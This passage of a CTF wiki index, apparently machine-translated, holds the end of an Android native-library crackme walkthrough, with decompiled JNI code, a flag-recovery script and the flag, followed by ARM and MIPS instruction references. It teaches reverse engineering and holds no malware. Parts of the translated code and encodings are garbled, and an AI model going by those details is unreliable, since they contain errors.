))( v2 , v4 , off_400C , 2 ) < 0 ) { v5 = \"RegisterNatives failed for '%s'\" ; goto LABEL_6 ; } return 65540 ; } It can be found that the program dynamically registers the class and the corresponding function off_400C here. Take a closer look at the function .data:0000400C off_400C DCD aTestflag ; DATA XREF: JNI_OnLoad+68\u2191o .data:0000400C ; .text:off_1258\u2191o .data: 0000400C; &quot;Test flag&quot; .data: 00004010 DCD andLjavaLangStrin_0; &quot;(Ljava / lang / String;)&quot; .data: 00004014 DCD abcdefghijklmn + 1 .data:00004018 DCD aHello ; \"hello\" .data:0000401C DCD aLjavaLangStrin_1 ; \"()Ljava/lang/String;\" .data:00004020 DCD native_hello+1 .data:00004020 ; .data ends It can be found that it is indeed the testflag function, and its corresponding function name is abcdefghijklmn.","title":"Analyzing so files"},{"location":"android/basic_reverse/static/so-example/#abcdefghijklmn","text":"It can be found that the program mainly judges the input v10 in three parts. Judgment 1 if ( strlen ( v10 ) == 16 ) Description The length of the input string is 16. Judgment 2 v3 = 0 ; do { s2 [ v3 ] = v10 [ v3 ] - v3 ; ++ v3 ; } while ( v3 != 8 ); v2 = 0 ; v12 = 0 ; if ( ! strcmp ( seed [ 0 ], s2 ) ) Judgment 3 v9 = (( * jniEnv ) -& gt ; FindClass ) (); if ( ! v9 ) { v4 = \"class,failed\" ; LABEL_11 : _android_log_print ( 4 , \"log\" , v4 ); exit ( 1 ); } v5 = (( * jniEnv ) -> GetStaticMethodID )(); if ( ! v5 ) { v4 = \"method,failed\" ; goto LABEL_11 ; } _JNIEnv :: CallStaticVoidMethod ( jniEnv , v9 , v5 ); v6 = (( * v1 ) -& gt ; GetStaticFieldID ) ( v1 , v9 , & quot ; key & quot ;, & quot ; Ljava / lang / String ; & quot ;); if ( ! v6 ) _android_log_print ( 4 , \"log\" , \"fid,failed\" ); (( * v1 ) -& gt ; GetStaticObjectField ) ( v1 , v9 , v6 ); v7 = (( * jniEnv ) -> GetStringUTFChars )(); while ( v3 < strlen ( v7 ) + 8 ) { v13 [ v3 - 8 ] = v10 [ v3 ] - v3 ; ++ v3 ; } v14 = 0 ; v2 = strcmp ( v7 , v13 ) <= 0 ; According to the assembly code, we can see that the static method in the calcKey class is called in the third judgment. ` asm .text:00001070 LDR R0, [R5] .text:00001072 LDR R2, =(aCalckey - 0x1080) .text: 00001074 LDR R3, = (aV - 0x1084) .text:00001076 LDR R4, [R0] .text:00001078 MOVS R1, #0x1C4 .text:0000107C ADD R2, PC ; \"calcKey\" .text:0000107E LDR R4, [R4,R1] .text:00001080 ADD R3, PC ; \"()V\" And after that, I got the contents of the key. ```Java public static String key; public static void calcKey() { key = new StringBuffer(\"c7^WVHZ,\").reverse().toString(); } }","title":"\u5206\u6790abcdefghijklmn"},{"location":"android/basic_reverse/static/so-example/#get-flag","text":"Based on these three judgments, we can get the input string content. s = & quot ; QflMn ` fH , ZHVW ^ 7 c & quot ; flag = \"\" for idx , c in enumerate ( s ): flag += chr ( ord ( c ) + idx ) print flag Results are as follows QgnPrelO4cRackEr It is not correct after the input.","title":"Get flag"},{"location":"android/basic_reverse/static/so-example/#again-analysis","text":"Think about it here, the program is not where to modify the corresponding string. Here first look at the seed. Cross-referenced x and found it used in _init_my as follows size_t _init_my () { size_t i ; // r7 char * v1 ; // r4 size_t result ; // r0 for ( i = 0 ; ; ++ i ) { v1 = seed [ 0 ]; result = strlen ( seed [ 0 ]); if ( i >= result ) break ; t [ i ] = v1 [ i ] - 3 ; } seed [ 0 ] = t ; byte_4038 = 0 ; return result ; } So the original program modified the seed.","title":"Again analysis"},{"location":"android/basic_reverse/static/so-example/#get-flag-again","text":"Modify the script as follows s = & quot ; QflMn ` fH , ZHVW ^ 7 c & quot ; flag = \"\" for idx , c in enumerate ( s ): tmp = word ( c ) if idx < 8 : tmp -= 3 flag += chr ( tmp + idx ) print flag Flag is as follows \u279c 2015- an APK on both sides of the strait, try it backwards python exp.py NdkMobiL4cRackEr Of course, this topic can also use dynamic debugging.","title":"Get flag again"},{"location":"assembly/arm/readme/","text":"Introduce the basic content of arm. 1. arm assembly basis \u00b6 1. LDMIA R0 , {R1,R2,R3,R4} \u00b6 LDM is: Multi-register \"internal access\" instruction IA indicates that R0 is incremented by 1 word after each LDM instruction ends. The final result is R1 = [R0], R1 = [R0+#4], R1 = [R0+#8], R1 = [R0+#0xC] 2. Stack addressing (FA, EA, FD, ED) \u00b6 STMFD SP! , {R1-R7, LR} @ Push R1~R7 and LR onto the stack LDMFD SP! , {R1-R7, LR} @ Pop R1~R7 and LR 3. Block copy addressing \u00b6 LDM and STM are instruction prefixes, indicating multi-register addressing, instruction suffixes (IA, DA, IB, DB). LDMIA R0!, {R1-R3} @Retrieve 3 words from the memory address pointed to by R0 to the R1, R2, R3 registers STMIA R0!, {R1-R3} @ Stores the contents stored by R1, R2, and R3 in the memory pointed to by R0. 4. Relative addressing \u00b6 With the current value of the current program counter PC as the base address, the label mark position is offset, and the two are added together. To a valid address. BL NEXT ... NEXT: ... 2. Instruction set \u00b6 1. Since the arm chip is updated very quickly, there are many instruction sets. The most common ones are the arm instruction set and the Thumb instruction set. \u00b6 2. Jump instruction \u00b6 Arm implements two types of jumps, one is to use jump instructions directly, and the other is to directly assign values to PC registers. 1. B jump instruction \u00b6 Structure B{cond} label Jump directly, such as `BNE LABEL` 2. BL jump instruction \u00b6 Structure BL{cond} label When the BL instruction is executed, if the condition is satisfied, the address of the next instruction of the current instruction is first assigned to the R14 register (LR). Then jump to the address marked by the label to continue execution. Generally used in process calls, after the process is over, return via `MOV PC, LR` 3. BX jump instruction with state switching \u00b6 Structure BX{cond}Rm When the BX instruction is executed, if the condition is satisfied, it will judge whether the bit [0] of the Rm register is 1, and if it is 1, the T flag of the CPSR register is automatically set to 1 at the time of the jump, and the instruction at the target position is Resolved as a Thumb instruction. Conversely, if bit [0] of the Rm register is 0, the T flag of the CPSR register is reset and the instruction at the target position is interpreted as an arm instruction. as follows: ADR R0, thumbcode + 1 BX R0 @ Jump to thumbcode. And the processor runs in thumb mode thumbcode: .code 16 4.BLX jump instruction with link and state switch \u00b6 Structure BLX{cond}Rm The BLX instruction aggregates the functions of BL and BX, and simultaneously saves the return address to R14 (LR) on the function of BX. 3. Register access instruction \u00b6 Memory access instruction operations include loading data from a memory area, storing data to a memory, exchanging data between registers and memory, and the like. LDR \u00b6 Put the data in memory into the register Example of instruction: LDRH R0, [R1] ; Read halfword data with memory address R1 into register R0 and clear the upper 16 bits of R0. LDRH R0, [R1, #8] ; Read halfword data with memory address R1+8 into register R0 and clear the upper 16 bits of R0. LDRH R0, [R1, R2] ; Read halfword data with memory address R1+R2 into register R0 and clear the upper 16 bits of R0. STR \u00b6 The STR is used to store data to an address. The format is as follows: STR{type}{cond}Rd,label Harden {cond} Rd, Rd2, label The usage is as follows: STR R0,[R2,#04] Store the value of R0 at the address of R2+4 LDM \u00b6 LDM{addr_mode}{cond}Rn{!}reglist This instruction is to allocate the data in the stack in memory to the register in batches, that is, the pop operation. > Special note, ! is an optional suffix. If there is! Then the final address will be written back to the Rn register. STM \u00b6 The STM stores the data of a register list into a specified address location. Format is as follows STM{addr_mod}{cond}Rn{!}reglist PUSH&&POP \u00b6 The format is as follows: PUSH {cond} reglist POP {cond} Stack operation instruction PUSH {r0,r4-r7} POP {r0,r4-r7} SWP \u00b6 Data exchange between registers. \u00b6 The format is SWP{B}{cond}Rd,Rm,[Rn] B is an optional byte. If there is B, the byte is exchanged. Otherwise, the word is exchanged. Rd is a temporarily stored register, and Rm is the value to be replaced. Rn is the data address of `to be replaced' Reference link \u00b6 [arm instruction learning] ( https://ring3.xyz/2017/03/05/[%E9%80%86%E5%90%91%E7%AF%87]arm%E6%8C%87%E4 % BB%A4%E5%AD%A6%E4%B9%A0/) [Common arm command] ( http://www.51-arm.com/upload/ARM_%E6%8C%87%E4%BB%A4.pdf ) arm-opcode-map","title":"arm"},{"location":"assembly/arm/readme/#1-arm-assembly-basis","text":"","title":"1. arm assembly basis"},{"location":"assembly/arm/readme/#1-ldmia-r0-r1r2r3r4","text":"LDM is: Multi-register \"internal access\" instruction IA indicates that R0 is incremented by 1 word after each LDM instruction ends. The final result is R1 = [R0], R1 = [R0+#4], R1 = [R0+#8], R1 = [R0+#0xC]","title":"1. LDMIA R0 , {R1,R2,R3,R4}"},{"location":"assembly/arm/readme/#2-stack-addressing-fa-ea-fd-ed","text":"STMFD SP! , {R1-R7, LR} @ Push R1~R7 and LR onto the stack LDMFD SP! , {R1-R7, LR} @ Pop R1~R7 and LR","title":"2. Stack addressing (FA, EA, FD, ED)"},{"location":"assembly/arm/readme/#3-block-copy-addressing","text":"LDM and STM are instruction prefixes, indicating multi-register addressing, instruction suffixes (IA, DA, IB, DB). LDMIA R0!, {R1-R3} @Retrieve 3 words from the memory address pointed to by R0 to the R1, R2, R3 registers STMIA R0!, {R1-R3} @ Stores the contents stored by R1, R2, and R3 in the memory pointed to by R0.","title":"3. Block copy addressing"},{"location":"assembly/arm/readme/#4-relative-addressing","text":"With the current value of the current program counter PC as the base address, the label mark position is offset, and the two are added together. To a valid address. BL NEXT ... NEXT: ...","title":"4. Relative addressing"},{"location":"assembly/arm/readme/#2-instruction-set","text":"","title":"2. Instruction set"},{"location":"assembly/arm/readme/#1-since-the-arm-chip-is-updated-very-quickly-there-are-many-instruction-sets-the-most-common-ones-are-the-arm-instruction-set-and-the-thumb-instruction-set","text":"","title":"1. Since the arm chip is updated very quickly, there are many instruction sets. The most common ones are the arm instruction set and the Thumb instruction set."},{"location":"assembly/arm/readme/#2-jump-instruction","text":"Arm implements two types of jumps, one is to use jump instructions directly, and the other is to directly assign values to PC registers.","title":"2. Jump instruction"},{"location":"assembly/arm/readme/#1-b-jump-instruction","text":"Structure B{cond} label Jump directly, such as `BNE LABEL`","title":"1. B jump instruction"},{"location":"assembly/arm/readme/#2-bl-jump-instruction","text":"Structure BL{cond} label When the BL instruction is executed, if the condition is satisfied, the address of the next instruction of the current instruction is first assigned to the R14 register (LR). Then jump to the address marked by the label to continue execution. Generally used in process calls, after the process is over, return via `MOV PC, LR`","title":"2. BL jump instruction"},{"location":"assembly/arm/readme/#3-bx-jump-instruction-with-state-switching","text":"Structure BX{cond}Rm When the BX instruction is executed, if the condition is satisfied, it will judge whether the bit [0] of the Rm register is 1, and if it is 1, the T flag of the CPSR register is automatically set to 1 at the time of the jump, and the instruction at the target position is Resolved as a Thumb instruction. Conversely, if bit [0] of the Rm register is 0, the T flag of the CPSR register is reset and the instruction at the target position is interpreted as an arm instruction. as follows: ADR R0, thumbcode + 1 BX R0 @ Jump to thumbcode. And the processor runs in thumb mode thumbcode: .code 16","title":"3. BX jump instruction with state switching"},{"location":"assembly/arm/readme/#4blx-jump-instruction-with-link-and-state-switch","text":"Structure BLX{cond}Rm The BLX instruction aggregates the functions of BL and BX, and simultaneously saves the return address to R14 (LR) on the function of BX.","title":"4.BLX jump instruction with link and state switch"},{"location":"assembly/arm/readme/#3-register-access-instruction","text":"Memory access instruction operations include loading data from a memory area, storing data to a memory, exchanging data between registers and memory, and the like.","title":"3. Register access instruction"},{"location":"assembly/arm/readme/#ldr","text":"Put the data in memory into the register Example of instruction: LDRH R0, [R1] ; Read halfword data with memory address R1 into register R0 and clear the upper 16 bits of R0. LDRH R0, [R1, #8] ; Read halfword data with memory address R1+8 into register R0 and clear the upper 16 bits of R0. LDRH R0, [R1, R2] ; Read halfword data with memory address R1+R2 into register R0 and clear the upper 16 bits of R0.","title":"LDR"},{"location":"assembly/arm/readme/#str","text":"The STR is used to store data to an address. The format is as follows: STR{type}{cond}Rd,label Harden {cond} Rd, Rd2, label The usage is as follows: STR R0,[R2,#04] Store the value of R0 at the address of R2+4","title":"STR"},{"location":"assembly/arm/readme/#ldm","text":"LDM{addr_mode}{cond}Rn{!}reglist This instruction is to allocate the data in the stack in memory to the register in batches, that is, the pop operation. > Special note, ! is an optional suffix. If there is! Then the final address will be written back to the Rn register.","title":"LDM"},{"location":"assembly/arm/readme/#stm","text":"The STM stores the data of a register list into a specified address location. Format is as follows STM{addr_mod}{cond}Rn{!}reglist","title":"STM"},{"location":"assembly/arm/readme/#pushpop","text":"The format is as follows: PUSH {cond} reglist POP {cond} Stack operation instruction PUSH {r0,r4-r7} POP {r0,r4-r7}","title":"PUSH&amp;&amp;POP"},{"location":"assembly/arm/readme/#swp","text":"","title":"SWP"},{"location":"assembly/arm/readme/#data-exchange-between-registers","text":"The format is SWP{B}{cond}Rd,Rm,[Rn] B is an optional byte. If there is B, the byte is exchanged. Otherwise, the word is exchanged. Rd is a temporarily stored register, and Rm is the value to be replaced. Rn is the data address of `to be replaced'","title":"Data exchange between registers."},{"location":"assembly/arm/readme/#reference-link","text":"[arm instruction learning] ( https://ring3.xyz/2017/03/05/[%E9%80%86%E5%90%91%E7%AF%87]arm%E6%8C%87%E4 % BB%A4%E5%AD%A6%E4%B9%A0/) [Common arm command] ( http://www.51-arm.com/upload/ARM_%E6%8C%87%E4%BB%A4.pdf ) arm-opcode-map","title":"Reference link"},{"location":"assembly/mips/readme/","text":"MIPS basic content. \u00b6 This is based on MIPS32 as an introduction. 0x01 Register \u00b6 (1) General purpose registers \u00b6 MIPS has 32 general purpose registers, represented by the dollar sign ($). Can be expressed as 0~ 0~ 31, and can also be represented by register names such as $sp, $t9, $fp, and so on. Register Number Conventional Name Usage Usage $0 $zero Hard-wired to 0 $1 $at Reserved for pseudo-instructions $2 - $3 $v0, $v1 Return values from functions Save expression or function return value $4 - $7 $a0 - $a3 Arguments to functions - not preserved by subprograms $8 - $15 $t0 - $t7 Temporary data, not preserved by subprograms $16 - $23 $s0 - $s7 Saved registers, preserved by subprograms $24 - $25 $t8 - $t9 More temporary registers, not preserved by subprograms Temporary registers, as a complement to $t0 - $t7, $t9 is usually related to calling functions $26 - $27 $k0 - $k1 Reserved for kernel. Do not use. $28 $gp Global Area Pointer (base of global data segment) MIPS as a load-store architecture means that when we want to access memory we must access it through load and store instructions. All other instructions (add, sub, mul, div, and so on) must fetch their operands from the register and store their results in registers. For example, the following example: sum = x + y We assume that sum and x , y are variables in the program, and their MIPS assembly is expressed as: # sum = x + y lw $t0, x # Load x from memory into a CPU register lw $t1, y # Load y from memory into a CPU register add $t0, $t0, $t1 # Add x and y sw $t0, sum # Store the result from the CPU register to memory ( 2 ) Special registers \u00b6 The MIPS32 architecture also defines three special registers, PC (program counter), HI (multiply and divide result high register), and LO (multiply and divide result low register). When multiplying, HI and LO hold the result of the multiplication, where HI holds the upper 32 bits and LO holds the lower 32 bits. In the division operation, HI saves the remainder and the LO saves the quotient. 0x2 Instruction Instruction \u00b6 ADD \u2013 Add (with overflow) Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: add $d, $s, $t Encoding: 0000 00ss ssh tttt dddd d000 0010 0000 ADDI -- Add immediate (with overflow) Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: addi $t, $s, imm Encoding: 0010 00ss ssst tttt iiii iiii iiii iiii ADDIU -- Add immediate unsigned (no overflow) Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: add $ t, $ s, imm Encoding: 0010 01ss ssst tttt iiii iiii iiii iiii ADDU -- Add unsigned (no overflow) Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: addu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0001 AND -- Bitwise and Description: Bitwise ands two registers and stores the result in a register Operation: $d = $s & $t; advance_pc (4); Syntax: and $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0100 ANDI -- Bitwise and immediate Description: Bitwise ands a register and an immediate value and stores the result in a register Operation: $t = $s & imm; advance_pc (4); Syntax: andi $t, $s, imm Encoding: 0011 00ss ssst tttt iiii iiii iiii iiii BEQ -- Branch on equal Description: Branches if the two registers are equal Operation: if $s == $t advance_pc (offset << 2)); else advance_pc (4); Syntax: beq $s, $t, offset Encoding: 0001 00ss ssst tttt iiii iiii iiii iiii BGEZ -- Branch on greater than or equal to zero Description: Branches if the register is greater than or equal to zero Operation: if $s >= 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bgez $s, offset Encoding: 0000 01ss sss0 0001 iiii iiii iiii iiii BGEZAL -- Branch on greater than or equal to zero and link Description: Branches if the register is greater than or equal to zero and saves the return address in $31 Operation: if $s >= 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); Syntax: bgezal $s, offset Encoding: 0000 01ss sss1 0001 iiii iiii iiii iiii BGTZ -- Branch on greater than zero Description: Branches if the register is greater than zero Operation: if $s > 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bgtz $s, offset Encoding: 0001 11ss sss0 0000 iiii iiii iiii iiii BLEZ -- Branch on less than or equal to zero Description: Branches if the register is less than or equal to zero Operation: if $s <= 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: blez $s, offset Encoding: 0001 10ss sss0 0000 iiii iiii iiii iiii BLTZ -- Branch on less than zero Description: Branches if the register is less than zero Operation: if $s < 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bltz $s, offset Encoding: 0000 01ss sss0 0000 iiii iiii iiii iiii BLTZAL -- Branch on less than zero and link Description: Branches if the register is less than zero and saves the return address in $31 Operation: if $s < 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); Syntax: bltzal $s, offset Encoding: 0000 01ss sss1 0000 iiii iiii iiii iiii BNE -- Branch on not equal Description: Branches if the two registers are not equal Operation: if $s != $t advance_pc (offset << 2)); else advance_pc (4); Syntax: bne $s, $t, offset Encoding: 0001 01ss ssst tttt iiii iiii iiii iiii DIV -- Divide Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); Syntax: div $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1010 DIVU - Divide unsigned Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); Syntax: divu $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1011 J -- Jump Description: Jumps to the calculated address Operation: PC = nPC; nPC = (PC & 0xf0000000) Syntax: j target Encoding: 0000 10ii iiii iiii iiii iiii iiii iiii JAL -- Jump and link Description: Jumps to the calculated address and stores the return address in $31 Operation: $31 = PC + 8 (or nPC + 4); PC = nPC; nPC = (PC & 0xf0000000) Syntax: jal target Encoding: 0000 11ii iiii iiii iiii iiii iiii iiii JR -- Jump register Description: Jump to the address contained in register $s Operation: PC = nPC; nPC = $s; Syntax: jr $s Encoding: 0000 00ss sss0 0000 0000 0000 0000 1000 LB -- Load byte Description: A byte is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lb $t, offset($s) Encoding: 1000 00ss ssst tttt iiii iiii iiii iiii LUI -- Load upper immediate Description: The immediate value is shifted left 16 bits and stored in the register. The lower 16 bits are zeroes. Operation: $t = (imm << 16); advance_pc (4); Syntax: lui $t, imm Encoding: 0011 11-- ---t tttt iiii iiii iiii iiii LW -- Load word Description: A word is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lw $t, offset($s) Encoding: 1000 11ss ssst tttt iiii iiii iiii iiii MFHI -- Move from HI Description: The contents of register HI are moved to the specified register. Operation: $d = $HI; advance_pc (4); Syntax: mfhi $d Encoding: 0000 0000 0000 0000 dddd d000 0001 0000 MFLO -- Move from LO Description: The contents of register LO are moved to the specified register. Operation: $d = $LO; advance_pc (4); Syntax: mflo $d Encoding: 0000 0000 0000 0000 dddd d000 0001 0010 MULT - Multiply Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: mult $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1000 MULTU - Multiply unsigned Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: multu $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1001 NOOP -- no operation Description: Performs no operation. Operation: advance_pc (4); Syntax: noop Encoding: 0000 0000 0000 0000 0000 0000 0000 0000 Note: The encoding for a NOOP represents the instruction SLL $0, $0, 0 which has no side effects. In fact, nearly every instruction that has $0 as its destination register will have no side effect and can thus be considered a NOOP instruction. OR -- Bitwise or Description: Bitwise logical ors two registers and stores the result in a register Operation: $d = $s Syntax: or $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0101 ORI -- Bitwise or immediate Description: Bitwise ors a register and an immediate value and stores the result in a register Operation: $t = $s Syntax: ori $t, $s, imm Encoding: 0011 01ss ssst tttt iiii iiii iiii iiii SB -- Store byte Description: The least significant byte of $t is stored at the specified address. Operation: MEM[$s + offset] = (0xff & $t); advance_pc (4); Syntax: sb $t, offset($s) Encoding: 1010 00ss ssst tttt iiii iiii iiii iiii SLL -- Shift left logical Description: Shifts a register value left by the shift amount listed in the instruction and places the result in a third register. Zeroes are shifted in. Operation: $d = $t << h; advance_pc (4); Syntax: sll $d, $t, h Encoding: 0000 00ss ssst tttt dddd dhhh hh00 0000 SLLV -- Shift left logical variable Description: Shifts a register value left by the value in a second register and places the result in a third register. Zeroes are shifted in. Operation: $d = $t << $s; advance_pc (4); Syntax: sllv $d, $t, $s Encoding: 0000 00ss ssst tttt dddd d--- --00 0100 SLT -- Set on less than (signed) Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: slt $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 1010 SLTI -- Set on less than immediate (signed) Description: If $s is less than immediate, $t is set to one. It gets zero otherwise. Operation: if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: slti $t, $s, imm Encoding: 0010 10ss ssst tttt iiii iiii iiii iiii SLTIU -- Set on less than immediate unsigned Description: If $s is less than the unsigned immediate, $t is set to one. It gets zero otherwise. Operation: if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: sltiu $t, $s, imm Encoding: 0010 11ss ssst tttt iiii iiii iiii iiii SLTU -- Set on less than unsigned Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: sltu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 1011 SRA -- Shift right arithmetic Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. The sign bit is shifted in. Operation: $d = $t >> h; advance_pc (4); Syntax: sra $d, $t, h Encoding: 0000 00-- ---t tttt dddd dhhh hh00 0011 SRL -- Shift right logical Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t >> h; advance_pc (4); Syntax: srl $d, $t, h Encoding: 0000 00-- ---t tttt dddd dhhh hh00 0010 SRLV -- Shift right logical variable Description: Shifts a register value right by the amount specified in $s and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t >> $s; advance_pc (4); Syntax: srlv $d, $t, $s Encoding: 0000 00ss ssst tttt dddd d000 0000 0110 SUB -- Subtract Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: sub $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0010 SUBU -- Subtract unsigned Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: subu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0011 SW -- Store word Description: The contents of $t is stored at the specified address. Operation: MEM[$s + offset] = $t; advance_pc (4); Syntax: sw $t, offset($s) Encoding: 1010 11ss ssst tttt iiii iiii iiii iiii SYSCALL -- System call Description: Generates a software interrupt. Operation: advance_pc (4); Syntax: syscall Encoding: 0000 00-- ---- ---- ---- ---- --00 1100 XOR -- Bitwise exclusive or Description: Exclusive ors two registers and stores the result in a register Operation: $d = $s ^ $t; advance_pc (4); Syntax: xor $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d--- --10 0110 XORI -- Bitwise exclusive or immediate Description: Bitwise exclusive ors a register and an immediate value and stores the result in a register Operation: $t = $s ^ imm; advance_pc (4); Syntax: xori $t, $s, imm Encoding: 0011 10ss ssst tttt iiii iiii iiii iiii Reference \u00b6 MIPS Instruction Reference","title":"mips"},{"location":"assembly/mips/readme/#mips-basic-content","text":"This is based on MIPS32 as an introduction.","title":"MIPS basic content."},{"location":"assembly/mips/readme/#0x01-register","text":"","title":"0x01 Register"},{"location":"assembly/mips/readme/#1-general-purpose-registers","text":"MIPS has 32 general purpose registers, represented by the dollar sign ($). Can be expressed as 0~ 0~ 31, and can also be represented by register names such as $sp, $t9, $fp, and so on. Register Number Conventional Name Usage Usage $0 $zero Hard-wired to 0 $1 $at Reserved for pseudo-instructions $2 - $3 $v0, $v1 Return values from functions Save expression or function return value $4 - $7 $a0 - $a3 Arguments to functions - not preserved by subprograms $8 - $15 $t0 - $t7 Temporary data, not preserved by subprograms $16 - $23 $s0 - $s7 Saved registers, preserved by subprograms $24 - $25 $t8 - $t9 More temporary registers, not preserved by subprograms Temporary registers, as a complement to $t0 - $t7, $t9 is usually related to calling functions $26 - $27 $k0 - $k1 Reserved for kernel. Do not use. $28 $gp Global Area Pointer (base of global data segment) MIPS as a load-store architecture means that when we want to access memory we must access it through load and store instructions. All other instructions (add, sub, mul, div, and so on) must fetch their operands from the register and store their results in registers. For example, the following example: sum = x + y We assume that sum and x , y are variables in the program, and their MIPS assembly is expressed as: # sum = x + y lw $t0, x # Load x from memory into a CPU register lw $t1, y # Load y from memory into a CPU register add $t0, $t0, $t1 # Add x and y sw $t0, sum # Store the result from the CPU register to memory","title":"(1) General purpose registers"},{"location":"assembly/mips/readme/#2-special-registers","text":"The MIPS32 architecture also defines three special registers, PC (program counter), HI (multiply and divide result high register), and LO (multiply and divide result low register). When multiplying, HI and LO hold the result of the multiplication, where HI holds the upper 32 bits and LO holds the lower 32 bits. In the division operation, HI saves the remainder and the LO saves the quotient.","title":"( 2 ) Special registers"},{"location":"assembly/mips/readme/#0x2-instruction-instruction","text":"ADD \u2013 Add (with overflow) Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: add $d, $s, $t Encoding: 0000 00ss ssh tttt dddd d000 0010 0000 ADDI -- Add immediate (with overflow) Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: addi $t, $s, imm Encoding: 0010 00ss ssst tttt iiii iiii iiii iiii ADDIU -- Add immediate unsigned (no overflow) Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: add $ t, $ s, imm Encoding: 0010 01ss ssst tttt iiii iiii iiii iiii ADDU -- Add unsigned (no overflow) Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: addu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0001 AND -- Bitwise and Description: Bitwise ands two registers and stores the result in a register Operation: $d = $s & $t; advance_pc (4); Syntax: and $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0100 ANDI -- Bitwise and immediate Description: Bitwise ands a register and an immediate value and stores the result in a register Operation: $t = $s & imm; advance_pc (4); Syntax: andi $t, $s, imm Encoding: 0011 00ss ssst tttt iiii iiii iiii iiii BEQ -- Branch on equal Description: Branches if the two registers are equal Operation: if $s == $t advance_pc (offset << 2)); else advance_pc (4); Syntax: beq $s, $t, offset Encoding: 0001 00ss ssst tttt iiii iiii iiii iiii BGEZ -- Branch on greater than or equal to zero Description: Branches if the register is greater than or equal to zero Operation: if $s >= 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bgez $s, offset Encoding: 0000 01ss sss0 0001 iiii iiii iiii iiii BGEZAL -- Branch on greater than or equal to zero and link Description: Branches if the register is greater than or equal to zero and saves the return address in $31 Operation: if $s >= 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); Syntax: bgezal $s, offset Encoding: 0000 01ss sss1 0001 iiii iiii iiii iiii BGTZ -- Branch on greater than zero Description: Branches if the register is greater than zero Operation: if $s > 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bgtz $s, offset Encoding: 0001 11ss sss0 0000 iiii iiii iiii iiii BLEZ -- Branch on less than or equal to zero Description: Branches if the register is less than or equal to zero Operation: if $s <= 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: blez $s, offset Encoding: 0001 10ss sss0 0000 iiii iiii iiii iiii BLTZ -- Branch on less than zero Description: Branches if the register is less than zero Operation: if $s < 0 advance_pc (offset << 2)); else advance_pc (4); Syntax: bltz $s, offset Encoding: 0000 01ss sss0 0000 iiii iiii iiii iiii BLTZAL -- Branch on less than zero and link Description: Branches if the register is less than zero and saves the return address in $31 Operation: if $s < 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); Syntax: bltzal $s, offset Encoding: 0000 01ss sss1 0000 iiii iiii iiii iiii BNE -- Branch on not equal Description: Branches if the two registers are not equal Operation: if $s != $t advance_pc (offset << 2)); else advance_pc (4); Syntax: bne $s, $t, offset Encoding: 0001 01ss ssst tttt iiii iiii iiii iiii DIV -- Divide Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); Syntax: div $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1010 DIVU - Divide unsigned Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); 